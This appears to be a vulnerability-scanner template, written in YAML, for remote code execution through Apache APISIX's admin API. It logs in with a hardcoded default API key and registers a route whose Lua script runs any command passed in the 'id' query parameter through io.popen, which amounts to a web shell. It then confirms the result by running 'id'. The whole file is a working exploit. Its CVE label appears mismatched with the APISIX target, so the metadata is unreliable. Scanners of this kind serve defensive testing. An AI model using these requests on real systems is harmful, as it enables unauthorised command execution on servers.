cve-id: CVE-2021-25646
# manual: true
transport: http
rules:
  - method: POST
    path: /apisix/admin/routes
    headers:
      Content-Type: application/json
      X-API-KEY: "edd1c9f034335f136f87ad84b625c8f1"
    body: |
      {"uri": "/api_status_test","script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n 
      local f = assert(io.popen(args.id, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
      "upstream": {"type": "roundrobin","nodes": {"example.com:80": 1}}}
    expression: response.status == 201
  - method: GET
    path: /api_status_test?id=id
    headers:
      X-API-KEY: "edd1c9f034335f136f87ad84b625c8f1"
    expression: response.status == 200 && response.body.bcontains(b"uid=") && response.body.bcontains(b"gid=") && response.body.bcontains(b"groups=")
severity:
  critical
type: 
  rce